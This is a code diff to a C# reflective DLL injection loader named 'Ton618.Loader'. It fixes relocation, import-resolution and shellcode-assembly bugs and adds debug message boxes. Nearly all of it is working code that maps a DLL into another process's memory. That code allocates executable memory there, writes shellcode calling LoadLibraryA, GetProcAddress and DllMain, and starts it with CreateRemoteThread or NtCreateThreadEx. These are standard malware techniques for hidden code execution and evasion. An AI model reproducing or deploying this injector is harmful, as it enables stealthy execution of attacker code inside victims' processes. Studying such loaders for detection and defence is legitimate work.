@@ -2,18 +2,20 @@
 using System;
 using System.Linq;
 using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Windows.Forms;
 using Ton618.Utilities;
 using Ton618.Utilities.PE;
 using static Ton618.Utilities.ClientNatives;
 
 namespace Ton618.Loader
 {
-    internal class ImageRelocator
+    internal class DllLoader
     {
         private readonly byte[] imageBytes;
         private PEImage pe;
 
-        public ImageRelocator(byte[] image)
+        public DllLoader(byte[] image)
         {
             imageBytes = image;
             pe = PEImage.ReadFromMemory(image, IntPtr.Zero, image.Length);
@@ -56,7 +58,7 @@ namespace Ton618.Loader
                 if (name.Equals(funcName, StringComparison.OrdinalIgnoreCase))
                 {
                     var ordinalPtr = peHandle.uplusptr(edt.AddressOfNameOrdinals + (i * i16size));
-                    var ordinal = Marshal.PtrToStructure<uint>(ordinalPtr);
+                    var ordinal = Marshal.PtrToStructure<ushort>(ordinalPtr);
                     var addrPtr = peHandle.uplusptr(edt.AddressOfFunctions + (ordinal * i32size));
                     var addr = Marshal.PtrToStructure<uint>(addrPtr);
                     return peHandle.uplusptr(addr);
@@ -66,7 +68,7 @@ namespace Ton618.Loader
             return IntPtr.Zero;
         }
 
-        public IntPtr Inject(IntPtr processHandle)
+        public (IntPtr localAddress, IntPtr remoteAddress) Inject(IntPtr processHandle)
         {
             var ptrSize = Marshal.SizeOf<IntPtr>();
 
@@ -101,9 +103,11 @@ namespace Ton618.Loader
             UpdateMemoryAddresses(localMem, remoteMem, pe.OriginalImageBase);
 
             ImportDllImports(localMem, remoteMem, processHandle);
+            MessageBox.Show("[DBG_DBG_DBG_DBG] After imports: " + GetLastError());
 
             if (!specifics.HasFlag(ReflectiveSpecific.NOT_NX_COMPAT))
                 UpdateMemoryProtectionFlags(localMem, remoteMem, processHandle);
+            MessageBox.Show("[DBG_DBG_DBG_DBG] After mem prot update: " + GetLastError());
 
             var written = UIntPtr.Zero;
             var state = WriteProcessMemory(processHandle, remoteMem, localMem, (UIntPtr)pe.SizeOfImage, ref written);
@@ -134,28 +138,37 @@ namespace Ton618.Loader
             var shellCodeSize = shellCode.Sum(s => s.Length) + ptrSize * 2;
             var shellCodeMem = Marshal.AllocHGlobal(shellCodeSize);
             var shellCodeMemOriginal = shellCodeMem;
+
             shellCodeMem.WriteBytes(shellCode[0]);
             shellCodeMem += shellCode[0].Length;
+
             Marshal.StructureToPtr(remoteMem, shellCodeMem, false);
+            shellCodeMem += ptrSize;
+
             shellCodeMem.WriteBytes(shellCode[1]);
             shellCodeMem += shellCode[1].Length;
+
             Marshal.StructureToPtr(dllmain, shellCodeMem, false);
+            shellCodeMem += ptrSize;
+
             shellCodeMem.WriteBytes(shellCode[2]);
+            shellCodeMem += shellCode[2].Length;
 
             var shellCodeRMem = VirtualAllocEx(processHandle, IntPtr.Zero, (UIntPtr)shellCodeSize, AllocationType.COMMIT | AllocationType.RESERVE, PageAccessRights.PAGE_EXECUTE_READWRITE);
             if (shellCodeRMem == IntPtr.Zero)
                 throw new Exception("Cannot allocate remote process memory for DllMain invocation.");
-            state = WriteProcessMemory(processHandle, shellCodeRMem, shellCodeMem, (UIntPtr)shellCodeSize, ref written);
+            state = WriteProcessMemory(processHandle, shellCodeRMem, shellCodeMemOriginal, (UIntPtr)shellCodeSize, ref written);
             if (!state || written != (UIntPtr)shellCodeSize)
                 throw new Exception("DllMain shellcode is not fully written to the target process memory.");
 
             var threadHandle = CreateRemoteThreadAuto(processHandle, shellCodeRMem, IntPtr.Zero);
             if (threadHandle == IntPtr.Zero)
                 throw new Exception("Cannot create remote DllMain invoker thread");
+            MessageBox.Show("[DBG_DBG_DBG_DBG] After thread creation: " + GetLastError());
 
             VirtualFreeEx(processHandle, shellCodeRMem, UIntPtr.Zero, MemFreeType.MEM_RELEASE);
 
-            return remoteMem;
+            return (localMem, remoteMem);
         }
 
         // Copy-Sections
@@ -191,9 +204,12 @@ namespace Ton618.Loader
 
             var imageBaseRelocSize = Marshal.SizeOf<IMAGE_BASE_RELOCATION>();
             var baseDifference = 0ul;
-            var subDifference = originalBase > remoteMem.ToUInt64();
-            if (subDifference)
+            var addDifference = true;
+            if (originalBase > remoteMem.ToUInt64())
+            {
                 baseDifference = originalBase - remoteMem.ToUInt64();
+                addDifference = false;
+            }
             else
                 baseDifference = remoteMem.ToUInt64() - originalBase;
             IntPtr baseRelocPtr = localMem.uplusptr(pe.BaseRelocationDirectory.VirtualAddress);
@@ -210,20 +226,20 @@ namespace Ton618.Loader
                 {
                     var relocationInfoPtr = baseRelocPtr + imageBaseRelocSize + (2 * i);
                     var relocationInfo = Marshal.PtrToStructure<ushort>(relocationInfoPtr);
-                    var relocOffset = relocationInfo | 0x0FFF;
-                    var relocType = (ImageRelocationType)(((relocationInfo | 0xF000) >> 12) & 0xF);
+                    var relocOffset = relocationInfo & 0x0FFFu;
+                    var relocType = (ImageRelocationType)(((relocationInfo & 0xF000u) >> 12) & 0xFu);
                     if (relocType == ImageRelocationType.IMAGE_REL_BASED_HIGHLOW | relocType == ImageRelocationType.IMAGE_REL_BASED_DIR64) // TODO: Support IMAGE_REL_BASED_HIGH IMAGE_REL_BASED_LOW
                     {
-                        var finalAddr = memAddrBase + relocOffset;
+                        var finalAddr = memAddrBase.uplusptr(relocOffset);
                         var currAddr = Marshal.PtrToStructure<IntPtr>(finalAddr);
-                        if (subDifference)
-                            currAddr = currAddr.uminusptr(baseDifference);
-                        else
+                        if (addDifference)
                             currAddr = currAddr.uplusptr(baseDifference);
+                        else
+                            currAddr = currAddr.uminusptr(baseDifference);
                         Marshal.StructureToPtr(currAddr, finalAddr, false);
                     }
                     else if (relocType != ImageRelocationType.IMAGE_REL_BASED_ABSOLUTE)
-                        throw new Exception("Unknown relocation: " + relocType + " at relocationInfo: " + relocationInfo);
+                        throw new Exception($"Unknown relocation: {relocType:X} at relocationInfo: {relocationInfo:X}");
                 }
                 tableSize -= baseRelocationTable.SizeOfBlock; // Extra overflow protection layer
                 baseRelocPtr = baseRelocPtr.uplusptr(baseRelocationTable.SizeOfBlock);
@@ -247,7 +263,7 @@ namespace Ton618.Loader
 
                 var importDllHandle = ImportDllInRemoteProcess(processHandle, importDllPathPtr);
                 if (importDllHandle == null || importDllHandle == IntPtr.Zero)
-                    throw new Exception("Import dll failed: " + Marshal.PtrToStringAnsi(importDllPathPtr));
+                    throw new Exception("Import dll failed: " + Marshal.PtrToStringAnsi(importDllPathPtr) + " win32 error " + ClientNatives.GetLastError());
 
                 var thunkRef = localMem.uplusptr(importDescriptor.FirstThunk);
                 var originalThunkRef = localMem.uplusptr(importDescriptor.Characteristics); //Characteristics is overloaded with OriginalFirstThunk
@@ -370,7 +386,10 @@ namespace Ton618.Loader
                 //For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
                 //Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
                 var loadLibraryARetMem = VirtualAllocEx(processHandle, IntPtr.Zero, dllPathSize, AllocationType.COMMIT | AllocationType.RESERVE, PageAccessRights.PAGE_READWRITE);
+                if (loadLibraryARetMem == IntPtr.Zero)
+                    throw new Exception("Failed to allocate LoadLibraryA return-memory Win32 Error " + GetLastError());
 
+                // SHELLCODE BEGIN
                 //Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
                 var shellCode = new byte[][]
                 {
@@ -383,18 +402,30 @@ namespace Ton618.Loader
 
                 var shellCodeMem = Marshal.AllocHGlobal(shellCodeSize);
                 var shellCodeMemOriginal = shellCodeMem;
+
                 shellCodeMem.WriteBytes(shellCode[0]);
                 shellCodeMem += shellCode[0].Length;
+
                 Marshal.StructureToPtr(rimportDllPathPtr, shellCodeMem, false);
+                shellCodeMem += ptrSize;
+
                 shellCodeMem.WriteBytes(shellCode[1]);
                 shellCodeMem += shellCode[1].Length;
+
                 Marshal.StructureToPtr(loadLibraryAddr, shellCodeMem, false);
+                shellCodeMem += ptrSize;
+
                 shellCodeMem.WriteBytes(shellCode[2]);
                 shellCodeMem += shellCode[2].Length;
+
                 Marshal.StructureToPtr(loadLibraryARetMem, shellCodeMem, false);
+                shellCodeMem += ptrSize;
+
                 shellCodeMem.WriteBytes(shellCode[3]);
+                // SHELLCODE END
 
                 var rscAddr = VirtualAllocEx(processHandle, IntPtr.Zero, (UIntPtr)shellCodeSize, AllocationType.COMMIT | AllocationType.RESERVE, PageAccessRights.PAGE_EXECUTE_READWRITE);
+
                 state = WriteProcessMemory(processHandle, rscAddr, shellCodeMemOriginal, (UIntPtr)shellCodeSize, ref numBytesWritten);
                 if (!state || (UIntPtr)shellCodeSize != numBytesWritten)
                     throw new Exception("Failed to write LoadLibraryA shellcode to the target process memory");
@@ -411,6 +442,7 @@ namespace Ton618.Loader
                 dllAddress = Marshal.PtrToStructure<IntPtr>(retValMem);
                 VirtualFreeEx(processHandle, loadLibraryARetMem, UIntPtr.Zero, MemFreeType.MEM_RELEASE);
                 VirtualFreeEx(processHandle, rscAddr, UIntPtr.Zero, MemFreeType.MEM_RELEASE);
+
             }
             else
             {
@@ -433,19 +465,20 @@ namespace Ton618.Loader
         private IntPtr CreateRemoteThreadAuto(IntPtr processHandle, IntPtr entryPoint, IntPtr paramPtr)
         {
             var threadHandle = IntPtr.Zero;
+
             if (Environment.OSVersion.Version > new Version(6, 0) && Environment.OSVersion.Version < new Version(6, 2)) // Windows Vista - 7
             {
                 // Use NtCreateThreadEx
                 var retVal = NtCreateThreadEx(ref threadHandle, 0x1FFFFF, IntPtr.Zero, processHandle, entryPoint, paramPtr, false, 0, 0xFFFF, 0xFFFF, IntPtr.Zero);
                 if (threadHandle == IntPtr.Zero)
-                    throw new Exception("NtCreateThreadEx failed: return=" + retVal + ", win32Error=" + Marshal.GetLastWin32Error());
+                    throw new Exception("NtCreateThreadEx failed: return=" + retVal + ", win32Error=" + ClientNatives.GetLastError());
             }
             else
             {
                 var tid = 0u;
                 threadHandle = CreateRemoteThread(processHandle, IntPtr.Zero, UIntPtr.Zero, entryPoint, paramPtr, 0, ref tid);
                 if (threadHandle == IntPtr.Zero)
-                    throw new Exception("CreateRemoteThread failed: win32Error=" + Marshal.GetLastWin32Error());
+                    throw new Exception("CreateRemoteThread failed: win32Error=" + ClientNatives.GetLastError());
             }
             return threadHandle;
         }
@@ -455,7 +488,7 @@ namespace Ton618.Loader
             bool state;
             var ptrSize = Marshal.SizeOf<IntPtr>();
             var rfuncNamePtr = IntPtr.Zero;
-            if (byOrdinal)
+            if (!byOrdinal)
             {
                 var funcNameStr = Marshal.PtrToStringAnsi(funcNameOrOrdinal);
                 var funcNamesize = (UIntPtr)(funcNameStr.Length + 1);
@@ -503,25 +536,40 @@ namespace Ton618.Loader
             var shellCodeSize = shellCode.Sum(s => s.Length) + ptrSize * 4;
             var shellCodeMem = Marshal.AllocHGlobal(shellCodeSize);
             var shellCodeMemOriginal = shellCodeMem;
+
             shellCodeMem.WriteBytes(shellCode[0]);
             shellCodeMem += shellCode[0].Length;
+
             Marshal.StructureToPtr(dllHandle, shellCodeMem, false);
+            shellCodeMem += ptrSize;
+
             shellCodeMem.WriteBytes(shellCode[1]);
             shellCodeMem += shellCode[1].Length;
+
             Marshal.StructureToPtr(rfuncNamePtr, shellCodeMem, false);
+            shellCodeMem += ptrSize;
+
             shellCodeMem.WriteBytes(shellCode[2]);
             shellCodeMem += shellCode[2].Length;
+
             Marshal.StructureToPtr(getprocaddr, shellCodeMem, false);
+            shellCodeMem += ptrSize;
+
             shellCodeMem.WriteBytes(shellCode[3]);
             shellCodeMem += shellCode[3].Length;
+
             Marshal.StructureToPtr(getprocaddrRetMem, shellCodeMem, false);
+            shellCodeMem += ptrSize;
+
             shellCodeMem.WriteBytes(shellCode[4]);
+            shellCodeMem += shellCode[4].Length;
 
             var shellCodeRMem = VirtualAllocEx(processHandle, IntPtr.Zero, (UIntPtr)shellCodeSize, AllocationType.COMMIT | AllocationType.RESERVE, PageAccessRights.PAGE_EXECUTE_READWRITE);
             if (shellCodeRMem == IntPtr.Zero)
                 throw new Exception("Cannot allocate target process memory for shellcode");
+
             var shellCodesWritten = UIntPtr.Zero;
-            state = WriteProcessMemory(processHandle, shellCodeRMem, shellCodeMem, (UIntPtr)shellCodeSize, ref shellCodesWritten);
+            state = WriteProcessMemory(processHandle, shellCodeRMem, shellCodeMemOriginal, (UIntPtr)shellCodeSize, ref shellCodesWritten);
             if (!state || shellCodesWritten != (UIntPtr)shellCodeSize)
                 throw new Exception("Cannot fully write the GetProcAddress shellcode to the target process.");
 
